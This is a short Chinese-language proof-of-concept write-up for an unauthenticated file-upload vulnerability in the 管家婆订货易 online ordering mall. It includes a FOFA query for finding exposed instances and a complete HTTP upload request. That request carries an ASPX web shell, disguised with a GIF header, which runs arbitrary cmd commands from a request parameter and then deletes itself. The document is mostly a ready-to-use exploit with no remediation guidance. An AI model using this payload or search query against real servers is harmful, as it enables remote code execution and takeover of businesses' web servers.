# 管家婆订货易在线商城UploadImgNoCheck存在文件上传漏洞

管家婆订货易在线商城是一个专为传统企业打造的B2B订货平台，帮助传统企业构建专属的订货平台，集合了PC商城、微信商城、小程序商城、APP商城以及H5触屏版商城，形成五网合一的全方位覆盖。` /api/Upload/UploadImgNoCheck `接口处存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```javascript
title="订货易" || title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"
```

## poc

```javascript
POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="Filedata";filename="rce.aspx"
Content-Type: image/jpeg

GIF89a
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundaryj7OlOPiiukkdktZR--
```

![image-20241128095645719](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280956783.png)